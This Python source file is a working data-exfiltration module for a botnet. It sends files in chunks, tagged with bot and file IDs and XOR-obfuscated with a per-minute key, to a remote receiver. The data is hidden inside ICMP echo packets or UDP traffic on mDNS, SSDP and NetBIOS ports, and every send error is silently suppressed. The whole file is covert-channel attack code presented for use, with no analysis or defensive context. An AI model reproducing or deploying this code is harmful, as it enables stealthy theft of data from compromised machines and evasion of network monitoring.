import socket
import struct
import time


def _icmp_checksum(data: bytes) -> int:
    """Compute ICMP checksum."""
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        w = data[i] << 8 | data[i+1]
        s += w
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return (~s) & 0xffff


def icmp_exfil(destination: str, payload: bytes, bot_id: str, file_id: str, chunk_size: int = 48, pause: float = 0.01) -> None:
    """Send data in chunks with a custom header for reassembly.

    Header structure per fragment:
        botlen(1) | botid | flen(1) | fileid | seq(2 little) | flags(1) | data
    The payload portion is XORed with the current minute key so receiver can
    decrypt.  ``flags`` bit0 == EOF.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except Exception:
        return

    seq = 0
    total = len(payload)
    sent = 0
    key = int(time.time() // 60)
    bot_bytes = bot_id.encode("utf-8")
    file_bytes = file_id.encode("utf-8")
    for offset in range(0, total, chunk_size):
        chunk = payload[offset : offset + chunk_size]
        sent += len(chunk)
        flags = 0
        if sent >= total:
            flags |= 1
        header_parts = []
        header_parts.append(len(bot_bytes).to_bytes(1, "little"))
        header_parts.append(bot_bytes)
        header_parts.append(len(file_bytes).to_bytes(1, "little"))
        header_parts.append(file_bytes)
        header_parts.append(seq.to_bytes(2, "little"))
        header_parts.append(flags.to_bytes(1, "little"))
        header = b"".join(header_parts)
        # encrypt
        enc = bytes(b ^ (key & 0xFF) for b in chunk)
        data = header + enc
        # ICMP header
        icmph = struct.pack("!BBHHH", 8, 0, 0, 0x1337, seq)
        packet = icmph + data
        chksum = _icmp_checksum(packet)
        icmph = struct.pack("!BBHHH", 8, 0, chksum, 0x1337, seq)
        packet = icmph + data
        try:
            sock.sendto(packet, (destination, 0))
        except Exception:
            pass
        seq = (seq + 1) & 0xFFFF
        time.sleep(pause)
    sock.close()


def udp_exfil(destination: str, payload: bytes, bot_id: str, file_id: str,
              port: int = 5353, chunk_size: int = 48, pause: float = 0.01) -> None:
    """Send data over UDP using the same custom header format used by ICMP.

    The receiver listens on well-known service ports (1900/137/5353/5355) and
    has joined the appropriate multicast groups.  ``destination`` can be a
    unicast address or a multicast group (e.g. ``224.0.0.251`` for mDNS).
    ``port`` controls which port is used; defaults to 5353 for mDNS.
    The packet header layout is identical to :func:`icmp_exfil`.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    seq = 0
    total = len(payload)
    sent = 0
    key = int(time.time() // 60)
    bot_bytes = bot_id.encode("utf-8")
    file_bytes = file_id.encode("utf-8")
    for offset in range(0, total, chunk_size):
        chunk = payload[offset:offset + chunk_size]
        sent += len(chunk)
        flags = 0
        if sent >= total:
            flags |= 1
        header_parts = []
        header_parts.append(len(bot_bytes).to_bytes(1, "little"))
        header_parts.append(bot_bytes)
        header_parts.append(len(file_bytes).to_bytes(1, "little"))
        header_parts.append(file_bytes)
        header_parts.append(seq.to_bytes(2, "little"))
        header_parts.append(flags.to_bytes(1, "little"))
        header = b"".join(header_parts)
        enc = bytes(b ^ (key & 0xFF) for b in chunk)
        data = header + enc
        try:
            sock.sendto(data, (destination, port))
        except Exception:
            pass
        seq = (seq + 1) & 0xFFFF
        time.sleep(pause)
    sock.close()
